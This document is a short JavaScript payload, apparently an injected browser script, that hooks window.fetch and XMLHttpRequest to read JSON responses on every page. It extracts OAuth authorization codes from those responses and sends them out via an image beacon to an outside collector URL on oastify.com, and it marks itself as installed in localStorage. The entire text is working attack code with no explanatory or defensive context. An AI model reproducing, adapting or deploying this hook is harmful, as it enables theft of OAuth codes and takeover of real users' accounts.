// Save “hook installed” flag so it persists
localStorage.setItem('hook_installed','1');

// Function to dynamically load the hook on every page
(function loadHook(){
    if(!window.hookActive){
        window.hookActive = true;

        // Hook fetch/XHR here as before
        const C = 'https://oumxk262urho2ovvr72la8mcm3sugp4e.oastify.com/collect';
        function exfil(k,v){ new Image().src = C+'?k='+encodeURIComponent(k)+'&v='+encodeURIComponent(v); }

        // Fetch hook
        const _fetch = window.fetch;
        window.fetch = function(input, init){
            return _fetch.apply(this, arguments).then(async res=>{
                try{
                    const r = res.clone();
                    const ct = r.headers.get('content-type')||'';
                    if(ct.includes('application/json')){
                        const t = await r.text().catch(()=>'');
                        const m = t.match(/code=(\d{6,})/);
                        if(m) exfil('oauth_code', m[1]);
                    }
                }catch(e){}
                return res;
            });
        };

        // XHR hook
        const _open = XMLHttpRequest.prototype.open;
        const _send = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(method,url){
            this._hook_url = url; return _open.apply(this,arguments);
        };
        XMLHttpRequest.prototype.send = function(body){
            this.addEventListener('load',()=>{
                try{
                    const ct = this.getResponseHeader && this.getResponseHeader('content-type')||'';
                    if(ct.includes('application/json')){
                        const m = this.responseText.match(/code=(\d{6,})/);
                        if(m) exfil('oauth_code', m[1]);
                    }
                }catch(e){}
            });
            return _send.apply(this,arguments);
        };
    }
})();
